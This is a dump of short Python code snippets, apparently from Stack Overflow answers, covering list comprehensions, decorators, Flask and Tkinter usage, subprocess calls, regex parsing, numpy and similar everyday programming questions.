</snippet></ROW><ROW><id>12019855</id><snippet>&gt;&gt;&gt; t = [[100, 'str_1'], [200, 'str_2'], [300, 'str_3']]

# Use enumerate to get each list item along with its index.
&gt;&gt;&gt; list(enumerate(t))
[(0, [100, 'str_1']), (1, [200, 'str_2']), (2, [300, 'str_3'])]

# Use list comprehension syntax to iterate over the enumeration.
&gt;&gt;&gt; [n for n, (i, s) in enumerate(t)]
[0, 1, 2]

# An if condition can be added right inside the list comprehension.
&gt;&gt;&gt; [n for n, (i, s) in enumerate(t) if s == 'str_3']
[2]
&gt;&gt;&gt; [n for n, (i, s) in enumerate(t) if s == 'str_1234']
[]
</snippet></ROW><ROW><id>12019855</id><snippet>&gt;&gt;&gt; t = {'str_1': 100, 'str_2': 200, 'str_3': 300}

&gt;&gt;&gt; 'str_3' in t
True
&gt;&gt;&gt; t['str_3']
300

&gt;&gt;&gt; 'str_1234' in t
False
&gt;&gt;&gt; t['str_1234']
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
KeyError: 'str_1234'
</snippet></ROW><ROW><id>12019906</id><snippet>$ sudo apt-get install libcurl-dev librtmp-dev 
$ pip install tornado pycurl
</snippet></ROW><ROW><id>12019906</id><snippet>from tornado import httpclient, ioloop

config = {
    'proxy_host': 'YOUR_PROXY_HOSTNAME_OR_IP_ADDRESS',
    'proxy_port': 3128
}

httpclient.AsyncHTTPClient.configure(
    "tornado.curl_httpclient.CurlAsyncHTTPClient")

def handle_request(response):
    if response.error:
        print "Error:", response.error
    else:
        print response.body
    ioloop.IOLoop.instance().stop()

http_client = httpclient.AsyncHTTPClient()
http_client.fetch("http://twitter.com/",
    handle_request, **config)
ioloop.IOLoop.instance().start()
</snippet></ROW><ROW><id>12019997</id><snippet>elem.text</snippet></ROW><ROW><id>12019997</id><snippet>elem</snippet></ROW><ROW><id>12019997</id><snippet>WebElement</snippet></ROW><ROW><id>12019997</id><snippet>tag_name</snippet></ROW><ROW><id>12019997</id><snippet>text</snippet></ROW><ROW><id>12019997</id><snippet>size</snippet></ROW><ROW><id>12019997</id><snippet>location</snippet></ROW><ROW><id>12019997</id><snippet>parent</snippet></ROW><ROW><id>12019997</id><snippet>id</snippet></ROW><ROW><id>12019997</id><snippet>.text</snippet></ROW><ROW><id>12019997</id><snippet>find_elements_*</snippet></ROW><ROW><id>12019997</id><snippet>find_element_*</snippet></ROW><ROW><id>12019997</id><snippet>WebElement</snippet></ROW><ROW><id>12020486</id><snippet>c = c1 if some_boolean else c2
c.some_function_of_class_C()
</snippet></ROW><ROW><id>12020486</id><snippet>vehicle = plane if distance &gt; 1000 else car
vehicle.travel()
</snippet></ROW><ROW><id>12020641</id><snippet>&gt;&gt;&gt; struct.pack('&lt;h', 1500)
'\xdc\x05'
</snippet></ROW><ROW><id>12020860</id><snippet>io.BytesIO</snippet></ROW><ROW><id>12020860</id><snippet>from PIL import Image
import urllib2 as urllib
import io

fd = urllib.urlopen("http://a/b/c")
image_file = io.BytesIO(fd.read())
im = Image.open(image_file)
</snippet></ROW><ROW><id>12020890</id><snippet>base64.py</snippet></ROW><ROW><id>12020935</id><snippet>int</snippet></ROW><ROW><id>12020935</id><snippet>def interpret_string(s):
    if not isinstance(s, str):
        return str(s)
    if s.isdigit():
        return int(s)
    try:
        return float(s)
    except:
        return s
</snippet></ROW><ROW><id>12020935</id><snippet>None</snippet></ROW><ROW><id>12020935</id><snippet>def interpret_string(s):
    if not isinstance(s, str):
        return None
    if s.isdigit():
        return int(s)
    try:
        return float(s)
    except:
        return None

val=raw_input("&gt; ")
how_much=interpret_string(val)
if how_much is None:
    # ask for more input? Error?
</snippet></ROW><ROW><id>12021023</id><snippet>Command</snippet></ROW><ROW><id>12021023</id><snippet>ActiveTcl</snippet></ROW><ROW><id>12021209</id><snippet>/Library/Python/2.7/site-packages/scikit_learn-0.12_git-py2.7-macosx-10.8-intel‌​.egg/sklearn</snippet></ROW><ROW><id>12021209</id><snippet>/Library/Python/2.7/site-packages/scikit_learn-0.12_git-py2.7-macosx-10.8-intel‌​.egg</snippet></ROW><ROW><id>12021597</id><snippet>avctype = self.db.users.find_one()["avctype"]</snippet></ROW><ROW><id>12021597</id><snippet>user={"pseudo":pseudo, "orientation":orientation, "avctype":avctype, "password":password, "email":email, "tel":tel, "commune":commune, "coord":coord, "statut":statut, "telf":telf, "avatar":avatar_id, "acheteur":[], "vendeur":[]}
</snippet></ROW><ROW><id>12021597</id><snippet>Traceback (most recent call last):
  File "C:\Python27\lib\site-packages\tornado-2.3.post1-py2.7.egg\tornado\web.py", line 1023, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "G:\Mon projet\sog-emouk\handlers.py", line 101, in get
    avctype = self.db.users.find_one()["avctype"]
TypeError: 'NoneType' object has no attribute '__getitem__'
</snippet></ROW><ROW><id>12021597</id><snippet>Traceback (most recent call last):
  File "C:\Python27\lib\site-packages\tornado-2.3.post1-py2.7.egg\tornado\web.py", line 1023, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "G:\Mon projet\sog-emouk\handlers.py", line 153, in post
    user={"pseudo":pseudo, "orientation":orientation, "avctype":avctype, "password":password, "email":email, "tel":tel, "commune":commune, "coord":coord, "statut":statut, "telf":telf, "avatar":avatar_id, "acheteur":[], "vendeur":[]}
UnboundLocalError: local variable 'orientation' referenced before assignment
</snippet></ROW><ROW><id>12021618</id><snippet> 2&lt;&lt;2 </snippet></ROW><ROW><id>12021618</id><snippet>a&lt;&lt;b == a*2^b</snippet></ROW><ROW><id>12021679</id><snippet>get_or_insert</snippet></ROW><ROW><id>12021679</id><snippet>put()</snippet></ROW><ROW><id>12021974</id><snippet>obj = client.factory.create('ns1:object')
obj.newField = 'value'
</snippet></ROW><ROW><id>12022047</id><snippet>\</snippet></ROW><ROW><id>12022047</id><snippet>In [68]: data = read_table('sample.txt', skiprows=3, header=None, sep=r"\s*")

In [69]: data
Out[69]: 
&lt;class 'pandas.core.frame.DataFrame'&gt;
Int64Index: 7 entries, 0 to 6
Data columns:
X.1     7  non-null values
X.2     7  non-null values
X.3     7  non-null values
X.4     7  non-null values
X.5     7  non-null values
X.6     7  non-null values
[...]
X.23    7  non-null values
X.24    7  non-null values
X.25    5  non-null values
X.26    3  non-null values
dtypes: float64(8), int64(10), object(8)
</snippet></ROW><ROW><id>12022047</id><snippet>In [73]: data.ix[:,20:]
Out[73]: 
   X.21  X.22           X.23                   X.24            X.25    X.26
0   315  0.95            ABC            transporter   transmembrane  region
1   527  0.93            ABC            transporter            None    None
2   408  0.86  RecF/RecN/SMC                      N        terminal  domain
3   575  0.85  RecF/RecN/SMC                      N        terminal  domain
4   556  0.72            AAA                 ATPase          domain    None
5   275  0.85      YceG-like                 family            None    None
6   200  0.85       Pyridine  nucleotide-disulphide  oxidoreductase    None
</snippet></ROW><ROW><id>12022050</id><snippet>def decorator_noarg(f):
    def wrapper(*args, **kwargs):
        print("Inside decorator-function, WITHOUT arg.")
        return f(*args, **kwargs)
    return wrapper

def decorator_witharg(dec_arg):
    def real_decorator(f):
        def wrapper(*args, **kwargs):
            print("Inside decorator-function, WITH arg: %s" % (dec_arg))
            return f(*args, **kwargs)
        return wrapper
    return real_decorator

class decoratorclass_noarg(object):
    f = None
    def __init__(self, f):
        def host_wrapper(*arg, **kwargs):
            print("Inside decorator-class, WITHOUT arg.")

            # We lose the original instance of the object.
            return f(test_class(), *arg, **kwargs)

        self.f = host_wrapper

    def __call__(self, *args, **kargs):
        return self.f(*args, **kargs)

class decoratorclass_witharg(object):
    f = None
    def __init__(self, dec_arg):
        def decorator(host_method):
            def host_wrapper(host_obj, *arg, **kwargs):
                print("Inside decorator-class, WITH arg: %s" % (dec_arg))
                return host_method(host_obj, *arg, **kwargs)
            return host_wrapper
        self.f = decorator

    def __call__(self, *args, **kwargs):
        return self.f(*args, **kwargs)

class decorator_on_function_noarg(object):
    f = None

    def __init__(self, f):
        self.f = f
        pass

    def __call__(self):
        print("Inside decorator-on-function class, without arg.")
        return self.f()

class decorator_on_function_witharg(object):
    f = None

    def __init__(self, dec_arg):
        def decorator(host_method):
            def host_wrapper(*arg, **kwargs):
                print("Inside decorator-on-function class, with arg: %s" % (dec_arg))
                return host_method(*arg, **kwargs)
            return host_wrapper
        self.f = decorator

    def __call__(self, *args, **kwargs):
        return self.f(*args, **kwargs)

def decorator_function_on_method_noarg(f):
    print("Inside decorator-function on method, without arg.")
    return f

def decorator_function_on_method_witharg(dec_arg):
    def wrapper(f):
        print("Inside decorator-function on method, with arg: %s" % (dec_arg))
        return f

# Testing calls.

class test_class(object):
    #@decorator_witharg(44)
    #@decorator_noarg
    #@decoratorclass_witharg(1)
    #@decoratorclass_noarg
    #@decorator_function_on_method_noarg
    #@decorator_function_on_method_witharg(33)
    def test_func(self, arg1, arg2):
        print("Inside: %s, %s" % (arg1, arg2))
        return 123

#@decorator_on_function_noarg
#@decorator_on_function_witharg(22)
def test_func():
    print("Inside test_func.")

#test_class().test_func(33, 44)
#test_func()
</snippet></ROW><ROW><id>12022055</id><snippet>pickle</snippet></ROW><ROW><id>12022055</id><snippet>myfunc</snippet></ROW><ROW><id>12022055</id><snippet>mymodule</snippet></ROW><ROW><id>12022055</id><snippet>mymodule.myfunc</snippet></ROW><ROW><id>12022055</id><snippet>pickle</snippet></ROW><ROW><id>12022055</id><snippet>bar</snippet></ROW><ROW><id>12022055</id><snippet>foo</snippet></ROW><ROW><id>12022055</id><snippet>__call__</snippet></ROW><ROW><id>12022055</id><snippet>class foo(a):
    def __init__(self, a):
        self.a = a
    def __call__(self, b): # the function formerly known as "bar"
        return self.a + b
</snippet></ROW><ROW><id>12022055</id><snippet>pickle</snippet></ROW><ROW><id>12022055</id><snippet>foo</snippet></ROW><ROW><id>12022112</id><snippet>form.errors</snippet></ROW><ROW><id>12022112</id><snippet>{% if errors %}</snippet></ROW><ROW><id>12022151</id><snippet>autochdir</snippet></ROW><ROW><id>12022151</id><snippet>:set autochdir
</snippet></ROW><ROW><id>12022151</id><snippet>:help 'autochdir'</snippet></ROW><ROW><id>12022191</id><snippet>error_messages = {'post_title':'post title','post_text':'post text','publish':'publication status'}
errors = [error_messages[key] for key in ('post_title','post_text','publish') if not request.POST.has_key(key)]
</snippet></ROW><ROW><id>12022251</id><snippet>random.sample</snippet></ROW><ROW><id>12022251</id><snippet>&gt;&gt;&gt; random.sample(word_drills, 3)
['has-a', 'attribute', 'instance']
</snippet></ROW><ROW><id>12022251</id><snippet>.keys()</snippet></ROW><ROW><id>12022251</id><snippet>random.sample</snippet></ROW><ROW><id>12022251</id><snippet>'has-a'</snippet></ROW><ROW><id>12022251</id><snippet>&gt;&gt;&gt; all(len(set(random.sample(word_drills, 3))) == 3 for i in range(10**5))
True
</snippet></ROW><ROW><id>12022406</id><snippet>cvQueryFrame:
The function cvQueryFrame [...] is just a combination of GrabFrame and RetrieveFrame.

RetrieveFrame:
The function cvRetrieveFrame returns the pointer to the image grabbed.
</snippet></ROW><ROW><id>12022406</id><snippet>import copy 
import cv

cv.NamedWindow("w1", cv.CV_WINDOW_AUTOSIZE)

#SET CAMERA INDEX BELOW
camera_index = -1 

capture = cv.CaptureFromCAM(camera_index)
isRunning = True
firstImage = copy.deepcopy(cv.QueryFrame(capture))

def repeat():
  global capture #declare as globals since we are assigning to them now
  global camera_index
  global isRunning
  global firstImage
  c = cv.WaitKey(100) % 0x100
  currImage = cv.QueryFrame(capture) 
  cv.ShowImage("w1",firstImage)

  if(c==27):
    isRunning = False

while isRunning:
    repeat()
</snippet></ROW><ROW><id>12022738</id><snippet>from tkinter import *
root = Tk()
w = Label(root, text="Take your Medicine \n :):)...Get Well Soon...")
w.pack()
root.mainloop()
</snippet></ROW><ROW><id>12022793</id><snippet>keys = random.sample(word_drills, 3)
print keys
print word_drills[random.choice(keys)]
</snippet></ROW><ROW><id>12022793</id><snippet>['has-a', 'attribute', 'class']
A phrase to say that something is composed of other things or has a trait, as in a Salmon *** mouth.
</snippet></ROW><ROW><id>12022848</id><snippet>f.write(str(entry))</snippet></ROW><ROW><id>12022848</id><snippet>str</snippet></ROW><ROW><id>12022848</id><snippet>write()</snippet></ROW><ROW><id>12022848</id><snippet>f.write("line1")
f.write("line2")
f.write("line3")
</snippet></ROW><ROW><id>12022848</id><snippet>line1line2line3
</snippet></ROW><ROW><id>12022848</id><snippet>f.readlines()</snippet></ROW><ROW><id>12022848</id><snippet>["['alpha', 'bravo']['one', 'two']['x', 'y']"]
</snippet></ROW><ROW><id>12022848</id><snippet>[a_string,]
</snippet></ROW><ROW><id>12022848</id><snippet>if (answer == text[1]):   
</snippet></ROW><ROW><id>12022848</id><snippet>    quiz, answer
    alpha, bravo
    one, two
    etc...
</snippet></ROW><ROW><id>12022848</id><snippet>with open("myquizfile.txt", "w") as f:
    while keepGoing: #You'd have to add your own exit logic.
        question = input("Enter a question: ")
        answer = input("Enter an answer: ")
        f.write("{0},{1}\n".format(question, answer)) #Notice the newline, \n
</snippet></ROW><ROW><id>12022848</id><snippet>with open("myquizfile.txt", "r") as f:
    question_answer_pairs = [line.split(",") for line in f]
</snippet></ROW><ROW><id>12023061</id><snippet>os.chdir(os.pardir)</snippet></ROW><ROW><id>12023061</id><snippet>os.chdir(os.path.join(*([os.pardir] * NUM_TIMES)))</snippet></ROW><ROW><id>12023183</id><snippet>form = EventForm(initial=map)
</snippet></ROW><ROW><id>12023237</id><snippet>self</snippet></ROW><ROW><id>12023237</id><snippet>__init__</snippet></ROW><ROW><id>12023237</id><snippet>class MyClass:
    def __init__(self):
        field = 0

print MyClass().field # an error! it's not defined!
</snippet></ROW><ROW><id>12023237</id><snippet>class</snippet></ROW><ROW><id>12023237</id><snippet>class MyClass:
    a = 2

print MyClass.a # 2
</snippet></ROW><ROW><id>12023237</id><snippet>class</snippet></ROW><ROW><id>12023272</id><snippet>enctype</snippet></ROW><ROW><id>12023272</id><snippet>multipart/form-data</snippet></ROW><ROW><id>12023272</id><snippet>&lt;form enctype="multipart/form-data" method="post" action="."&gt;
</snippet></ROW><ROW><id>12023272</id><snippet>request.FILES</snippet></ROW><ROW><id>12023272</id><snippet>request.POST</snippet></ROW><ROW><id>12023272</id><snippet>request.FILES</snippet></ROW><ROW><id>12023272</id><snippet>form = ScribbleSaveForm(request.POST, request.FILES)
</snippet></ROW><ROW><id>12023418</id><snippet>POS_SERVO = struct.pack('&lt;h', int(posicion))
</snippet></ROW><ROW><id>12023510</id><snippet>def __init__(self, showBase):
</snippet></ROW><ROW><id>12023536</id><snippet>for</snippet></ROW><ROW><id>12023616</id><snippet>import re

d = """
&lt;VirtualHost&gt;
  ServerName blah.com
  DocumentRoot /var/www/blah.com
&lt;/Virtualhost&gt;
&lt;VirtualHost&gt;
  ServerName blah2.com
  DocumentRoot /var/www/blah2.com
&lt;/Virtualhost&gt;
"""

matches = re.findall(r'&lt;VirtualHost&gt;(.*?)&lt;/Virtualhost&gt;', d, re.I|re.DOTALL)

#['\n  ServerName blah.com\n  DocumentRoot /var/www/blah.com\n',
# '\n  ServerName blah2.com\n  DocumentRoot /var/www/blah2.com\n']
</snippet></ROW><ROW><id>12023616</id><snippet>&lt;VirtualHost&gt;</snippet></ROW><ROW><id>12023616</id><snippet>matches = re.findall(r'&lt;VirtualHost&gt;.*?&lt;/Virtualhost&gt;', d, re.I|re.DOTALL)

#['&lt;VirtualHost&gt;\n  ServerName blah.com\n  DocumentRoot /var/www/blah.com\n&lt;/Virtualhost&gt;',
# '&lt;VirtualHost&gt;\n  ServerName blah2.com\n  DocumentRoot /var/www/blah2.com\n&lt;/Virtualhost&gt;']
</snippet></ROW><ROW><id>12023700</id><snippet>main</snippet></ROW><ROW><id>12023700</id><snippet>try ... catch</snippet></ROW><ROW><id>12023700</id><snippet>Class MyRequestHandler(RequestHandler):
    def get(self):
        try:
            self.get_handler()
        except CapabilityDisabledError:
            pass

class MyRequest(MyRequestHandler):
    def get_handler(self):
        # ....
        pass
</snippet></ROW><ROW><id>12023801</id><snippet>groups = []
for k,g in itertools.groupby(input_list, lambda x: x is not None):
    if k:
        groups.append(list(g))
</snippet></ROW><ROW><id>12023885</id><snippet>POST</snippet></ROW><ROW><id>12023885</id><snippet>GET</snippet></ROW><ROW><id>12023885</id><snippet>BadRequest</snippet></ROW><ROW><id>12023885</id><snippet>request.args</snippet></ROW><ROW><id>12023885</id><snippet>request.form</snippet></ROW><ROW><id>12023885</id><snippet>get</snippet></ROW><ROW><id>12023885</id><snippet>None</snippet></ROW><ROW><id>12023885</id><snippet># Will default to None
your_var = request.form.get("some_key")

# Alternately:
your_var = request.form.get("some_key", "alternate_default_value")
</snippet></ROW><ROW><id>12023885</id><snippet>import sys
import flask, flask.views

app = flask.Flask(__name__)

app.secret_key = "bacon"
app.debug = True


class View(flask.views.MethodView):
    def get(self):
        """Enable user to provide us with input"""
        return self._default_actions()

    def post(self):
        """Map user input to our program's inputs - display errors if required"""
        result = flask.request.form['result']
        # Alternately, if `result` is not *required*
        # result = flask.request.form.get("result")
        return self._default_actions(result=result)

    def _default_actions(self, result=None):
        """Deal with the meat of the matter, taking in whatever params we need
        to get or process our information"""
        if result is None:
            return flask.render_template("test.html")
        else:
            return flask.render_template("test.html", result=result)

app.add_url_rule('/', view_func=View.as_view('main'), methods=['GET', 'POST'])

if __name__ == "__main__":
    app.run()
</snippet></ROW><ROW><id>12024089</id><snippet>myLabel = Label(frame, textvariable=myLabelText).pack()
</snippet></ROW><ROW><id>12024089</id><snippet>myLabel = Label(frame, textvariable=myLabelText)
myLabel.pack()
</snippet></ROW><ROW><id>12024089</id><snippet>myLabel.configure(text='new text')
</snippet></ROW><ROW><id>12024089</id><snippet>myLabel['text'] = 'new text'
</snippet></ROW><ROW><id>12024089</id><snippet>update_idletasks()</snippet></ROW><ROW><id>12024089</id><snippet>time.sleep()</snippet></ROW><ROW><id>12024089</id><snippet>after(milliseconds, method)</snippet></ROW><ROW><id>12024089</id><snippet>return</snippet></ROW><ROW><id>12024180</id><snippet># If your input is in in_seq...
if hasattr(in_seq[0], "__iter__"):
    # b case
else:
    # a case
</snippet></ROW><ROW><id>12024180</id><snippet>if isinstance(in_seq[0], tuple):
    # b case
else:
    # a case
</snippet></ROW><ROW><id>12024180</id><snippet>b_case = (a_case,)
</snippet></ROW><ROW><id>12024180</id><snippet>from collections import Iterable
if isinstance(in_seq[0], Iterable):
    # ...
</snippet></ROW><ROW><id>12024190</id><snippet>static PyObject *
Largest_richcompare(PyObject *self, PyObject *other, int op)
{
    PyObject *result = NULL;

    if (UndefinedObject_Check(other)) {
        result = Py_NotImplemented;
    }
    else {
        switch (op) {
        case Py_LT:
            result = Py_False;
            break;
        case Py_LE:
            result = (LargestObject_Check(other)) ? Py_True : Py_False;
            break;
        case Py_EQ:
            result = (LargestObject_Check(other)) ? Py_True : Py_False;
            break;
        case Py_NE:
            result = (LargestObject_Check(other)) ? Py_False : Py_True;
            break;
        case Py_GT:
            result = (LargestObject_Check(other)) ? Py_False : Py_True;
            break;
        case Py_GE:
            result = Py_True;
            break;
        }
    }

    Py_XINCREF(result);
    return result;
}
</snippet></ROW><ROW><id>12024190</id><snippet>(richcmpfunc)&amp;Largest_richcompare,       /* tp_richcompare */
</snippet></ROW><ROW><id>12024190</id><snippet>Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_RICH_COMPARE,        /* tp_flags */
</snippet></ROW><ROW><id>12024377</id><snippet>question = word_drills[random.choice(keys)]
print question
</snippet></ROW><ROW><id>12024377</id><snippet>question</snippet></ROW><ROW><id>12024388</id><snippet>brew install mod_wsgi</snippet></ROW><ROW><id>12024388</id><snippet>brew install mod_wsgi</snippet></ROW><ROW><id>12024388</id><snippet>LoadModule wsgi_module /usr/local/Cellar/mod_wsgi/3.3/libexec/mod_wsgi.so</snippet></ROW><ROW><id>12024388</id><snippet>apachectl restart</snippet></ROW><ROW><id>12024441</id><snippet>chr(n)</snippet></ROW><ROW><id>12024441</id><snippet>n</snippet></ROW><ROW><id>12024441</id><snippet>import os
path = r'C:\Users\me\Desktop\output'
for counter in xrange(100):
    with open(os.path.join(path,'{:02x}.txt'.format(counter)),'wb') as f:
        f.write(chr(counter))
</snippet></ROW><ROW><id>12024441</id><snippet>f.write</snippet></ROW><ROW><id>12024441</id><snippet>chr(counter)</snippet></ROW><ROW><id>12024441</id><snippet>'wb'</snippet></ROW><ROW><id>12024510</id><snippet>WeakValueDictionary</snippet></ROW><ROW><id>12024593</id><snippet>import csv
rows = csv.reader(open('yourfile.csv', 'rb'), delimiter=' ', quotechar='|')
arows = [row for row in rows if 'a' in row]
</snippet></ROW><ROW><id>12024611</id><snippet>Date</snippet></ROW><ROW><id>12024611</id><snippet>year</snippet></ROW><ROW><id>12024611</id><snippet>month</snippet></ROW><ROW><id>12024611</id><snippet>.filter(extract('year', Foo.Date) == 2012)
.filter(extract('month', Foo.Date) == 12)
</snippet></ROW><ROW><id>12024611</id><snippet>group_by</snippet></ROW><ROW><id>12024611</id><snippet>.group_by(sqlalchemy.func.year(Foo.Date), sqlalchemy.func.month(Foo.Date))
</snippet></ROW><ROW><id>12024790</id><snippet>INSTALLED_APPS</snippet></ROW><ROW><id>12024790</id><snippet>settings.py</snippet></ROW><ROW><id>12024790</id><snippet>urls.py</snippet></ROW><ROW><id>12024790</id><snippet>pip freeze</snippet></ROW><ROW><id>12024790</id><snippet>requirements.txt</snippet></ROW><ROW><id>12024790</id><snippet>pip freeze</snippet></ROW><ROW><id>12024790</id><snippet>django-follow</snippet></ROW><ROW><id>12024790</id><snippet>pip install django-follow</snippet></ROW><ROW><id>12024981</id><snippet>array</snippet></ROW><ROW><id>12024981</id><snippet>matrix</snippet></ROW><ROW><id>12024981</id><snippet>numpy</snippet></ROW><ROW><id>12024981</id><snippet>matrix</snippet></ROW><ROW><id>12024981</id><snippet>numpy</snippet></ROW><ROW><id>12024981</id><snippet>array</snippet></ROW><ROW><id>12024981</id><snippet>array</snippet></ROW><ROW><id>12024981</id><snippet>matrix</snippet></ROW><ROW><id>12024981</id><snippet>array</snippet></ROW><ROW><id>12024981</id><snippet>numpy.dot()</snippet></ROW><ROW><id>12024981</id><snippet>*</snippet></ROW><ROW><id>12024981</id><snippet>numpy.array</snippet></ROW><ROW><id>12024981</id><snippet>array</snippet></ROW><ROW><id>12024981</id><snippet>matrix</snippet></ROW><ROW><id>12024981</id><snippet>numpy/scipy</snippet></ROW><ROW><id>12024981</id><snippet>numpy/scipy</snippet></ROW><ROW><id>12024981</id><snippet>array</snippet></ROW><ROW><id>12024981</id><snippet>matrix</snippet></ROW><ROW><id>12025492</id><snippet>.open()</snippet></ROW><ROW><id>12025492</id><snippet>ZipFile</snippet></ROW><ROW><id>12025492</id><snippet>ZipFile</snippet></ROW><ROW><id>12025492</id><snippet>.open()</snippet></ROW><ROW><id>12025492</id><snippet>.read()</snippet></ROW><ROW><id>12025492</id><snippet>StringIO</snippet></ROW><ROW><id>12025492</id><snippet>ZipFile</snippet></ROW><ROW><id>12025492</id><snippet>from cStringIO import StringIO

# ...
        zfiledata = StringIO(zfile.read(name))
        with zipfile.ZipFile(zfiledata) as zfile2:
</snippet></ROW><ROW><id>12025591</id><snippet>'_'</snippet></ROW><ROW><id>12025591</id><snippet>(1).__add__(2)
</snippet></ROW><ROW><id>12025591</id><snippet>1</snippet></ROW><ROW><id>12025591</id><snippet>&gt;&gt;&gt; 1 .__add__(2) 
3
</snippet></ROW><ROW><id>12025591</id><snippet>.</snippet></ROW><ROW><id>12025591</id><snippet>&gt;&gt;&gt; range(4) .count(3)
1
</snippet></ROW><ROW><id>12025591</id><snippet>.</snippet></ROW><ROW><id>12025591</id><snippet>+</snippet></ROW><ROW><id>12025657</id><snippet>check_output</snippet></ROW><ROW><id>12025657</id><snippet>#!/usr/bin/env python
import subprocess

cmd = 'adb shell ls'
s = subprocess.check_output(cmd.split())
print s.split('\r\n')
</snippet></ROW><ROW><id>12025763</id><snippet>&gt;&gt;&gt; col1 = ['2006-03-28','2006-04-05','2006-04-06']
&gt;&gt;&gt; col2 = ['IBM', 'MSFT', 'IBM']
&gt;&gt;&gt; col3 = [1000, 1000, 500]
&gt;&gt;&gt; zip(col1, col2, col3)
[('2006-03-28', 'IBM', 1000), ('2006-04-05', 'MSFT', 1000), ('2006-04-06', 'IBM', 500)]
</snippet></ROW><ROW><id>12025763</id><snippet>zip(*cols)</snippet></ROW><ROW><id>12025767</id><snippet>def update(all_marks, stud_num, mark, column):
    for i in range(len(all_marks)):
        if stud_num in all_marks[i]:
            all_marks[i][column] = mark
    return all_marks
</snippet></ROW><ROW><id>12025767</id><snippet>&gt;&gt;&gt; marks
[['a', '', '', '', '', ''], ['b', '', '', '', '', ''], ['c', '', '', '', '', ''], ['d', '', '', '', '', ''], ['e', '', '', '', '', ''], ['f', '', '', '', '', ''], ['g', '', '', '', '', '']]

&gt;&gt;&gt; update(marks,'a','10',2)
[['a', '', '10', '', '', ''], ['b', '', '', '', '', ''], ['c', '', '', '', '', ''], ['d', '', '', '', '', ''], ['e', '', '', '', '', ''], ['f', '', '', '', '', ''], ['g', '', '', '', '', '']]
</snippet></ROW><ROW><id>12025767</id><snippet>marks</snippet></ROW><ROW><id>12025767</id><snippet>&gt;&gt;&gt; marks
[['a', '', '10', '', '', ''], ['b', '', '', '', '', ''], ['c', '', '', '', '', ''], ['d', '', '', '', '', ''], ['e', '', '', '', '', ''], ['f', '', '', '', '', ''], ['g', '', '', '', '', '']]
</snippet></ROW><ROW><id>12025767</id><snippet>def update(all_marks, stud_num, mark, column):
    tmp = all_marks
    for i in range(len(tmp)):
        if stud_num in tmp[i]:
            tmp[i][column] = mark
    return tmp
</snippet></ROW><ROW><id>12026129</id><snippet>&gt;</snippet></ROW><ROW><id>12026129</id><snippet>style</snippet></ROW><ROW><id>12026129</id><snippet>pattern_str = '(?P&lt;style&gt;[^|]*)\|(?P&lt;tags&gt;[^|]*)'
</snippet></ROW><ROW><id>12026204</id><snippet>except urllib.error.URLError as e: ResponseData = e.read().decode("utf8", 'ignore')
</snippet></ROW><ROW><id>12026377</id><snippet>__del__()</snippet></ROW><ROW><id>12026377</id><snippet>gc</snippet></ROW><ROW><id>12026377</id><snippet>__del__()</snippet></ROW><ROW><id>12026377</id><snippet>__del__()</snippet></ROW><ROW><id>12026377</id><snippet>__del__()</snippet></ROW><ROW><id>12026377</id><snippet>del gc.garbage[:]</snippet></ROW><ROW><id>12026377</id><snippet>__del__()</snippet></ROW><ROW><id>12026377</id><snippet>MyClass</snippet></ROW><ROW><id>12026377</id><snippet>class MyClass(object):
    def refer_to(self, thing):
        self.refers_to = thing
    def __del__(self):
        print 'Being deleted now, bye-bye!'
</snippet></ROW><ROW><id>12026377</id><snippet>&lt;__main__.MyClass object at 0x108476a50&gt;
</snippet></ROW><ROW><id>12026377</id><snippet>.refer_to()</snippet></ROW><ROW><id>12026377</id><snippet>Being deleted now, bye-bye!
Being deleted now, bye-bye!
None
</snippet></ROW><ROW><id>12026377</id><snippet>__del__()</snippet></ROW><ROW><id>12026542</id><snippet>subprocess</snippet></ROW><ROW><id>12026542</id><snippet>gs</snippet></ROW><ROW><id>12026542</id><snippet>gs</snippet></ROW><ROW><id>12026542</id><snippet>PATH</snippet></ROW><ROW><id>12026542</id><snippet>gs</snippet></ROW><ROW><id>12026542</id><snippet>/usr/bin/gs</snippet></ROW><ROW><id>12026542</id><snippet>subprocess</snippet></ROW><ROW><id>12026542</id><snippet>Python 2.7.3 (default, Aug  1 2012, 05:14:39) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; subprocess.call("nonexistent")
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "/usr/lib/python2.7/subprocess.py", line 493, in call
    return Popen(*popenargs, **kwargs).wait()
  File "/usr/lib/python2.7/subprocess.py", line 679, in __init__
    errread, errwrite)
  File "/usr/lib/python2.7/subprocess.py", line 1249, in _execute_child
    raise child_exception
OSError: [Errno 2] No such file or directory
</snippet></ROW><ROW><id>12026542</id><snippet>gs</snippet></ROW><ROW><id>12026542</id><snippet>Python 2.7.3 (default, Aug  1 2012, 05:14:39) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; subprocess.call("ls /usr")
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "/usr/lib/python2.7/subprocess.py", line 493, in call
    return Popen(*popenargs, **kwargs).wait()
  File "/usr/lib/python2.7/subprocess.py", line 679, in __init__
    errread, errwrite)
  File "/usr/lib/python2.7/subprocess.py", line 1249, in _execute_child
    raise child_exception
OSError: [Errno 2] No such file or directory
&gt;&gt;&gt; subprocess.call(["ls", "/usr"])
bin  games  include  lib  lib32  lib64  local  sbin  share  src  X11R6
0
</snippet></ROW><ROW><id>12026542</id><snippet>ls /usr</snippet></ROW><ROW><id>12026542</id><snippet>gs</snippet></ROW><ROW><id>12026542</id><snippet>sp = subprocess.Popen(['/usr/bin/gs', '-dSAFER', '-dNOPAUSE', '-dQUIET', '-dBATCH', '-sDEVICE=jpeg', '-sOUTPUTFILE=' + path + "/static.jpg", path + "/source.pdf"])
</snippet></ROW><ROW><id>12026693</id><snippet>import shutil
import datetime

now = datetime.datetime.now()
date=str(now.year)+'-'+str(now.month)+'-'+str(now.day)

new_folder = "source/new_folder"
dest = new_folder + '/' + str(date) + '.jpg'
shutil.copy('source/alpha.jpg', dest)
</snippet></ROW><ROW><id>12026718</id><snippet>from django.contrib.contenttypes.models import ContentType
